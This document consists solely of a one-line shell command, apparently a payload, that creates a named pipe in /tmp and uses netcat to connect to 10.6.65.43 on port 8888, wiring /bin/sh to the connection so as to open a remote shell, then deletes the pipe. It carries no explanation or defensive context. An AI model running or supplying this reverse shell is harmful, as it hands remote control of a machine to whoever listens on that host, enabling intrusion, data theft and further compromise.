mkfifo /tmp/wmvdr; nc 10.6.65.43 8888 0</tmp/wmvdr | /bin/sh >/tmp/wmvdr 2>&1; rm /tmp/wmvdr